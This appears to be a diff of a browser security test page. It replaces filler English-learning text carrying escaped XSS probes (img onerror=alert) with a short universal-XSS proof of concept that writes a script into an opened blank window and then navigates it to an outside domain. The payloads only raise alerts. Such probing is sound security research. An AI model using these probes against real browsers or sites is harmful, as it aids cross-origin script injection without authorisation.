@@ -1,37 +1,18 @@
-<html lang="en">
-<head>
-<title>test</title>
-<meta charset="utf-8">
-</head>
+<html>
+<head><title>test</title></head>
 <body>
-
-<h1>How to learn English quickly</h1>
-
-<p>
-Learning English is very important for your future. You need to practice every day.
-Read books, watch movies, and talk with friends. The more you practice, the better you will become.
-Do not be afraid to make mistakes. Mistakes are part of learning. Keep trying and keep practicing.
-</p>
-
-<p>
-This is a very long article about learning English. If you want to improve your English,
-you should read this article carefully from the beginning to the end. This article will help
-you understand how to learn English faster and easier.
-</p>
-
-<!-- PAYLOAD SEBAGAI TEKS, BUKAN TAG -->
-<p id="p">
-My favorite image is &lt;img src=x onerror=alert(1)&gt; and I like it very much.
-I saw this image yesterday and it was very beautiful. I want to show it to my friends.
-Please look at this image &lt;img src=x onerror=alert(2)&gt; it is very interesting.
-</p>
-
-<p>
-Thank you for reading this article. I hope this article helps you learn English.
-Please share this article with your friends if you like it. See you in the next article.
-</p>
-
-<p id="h">status: not translated yet</p>
-
+<p>uxss test 1</p>
+<button onclick="go()">click here</button>
+<p id="h"></p>
+<script>
+function go(){
+  var win = window.open('about:blank', '_blank');
+  win.document.write('<h1>from opener</h1><script>alert("UXSS? domain=" + document.domain)<\/script>');
+  setTimeout(function(){
+    document.getElementById('h').innerText = 'BYPASS! trying to navigate blank to second domain';
+    win.location = 'https://download-bypass.netlify.app/';
+  }, 500);
+}
+</script>
 </body>
 </html>
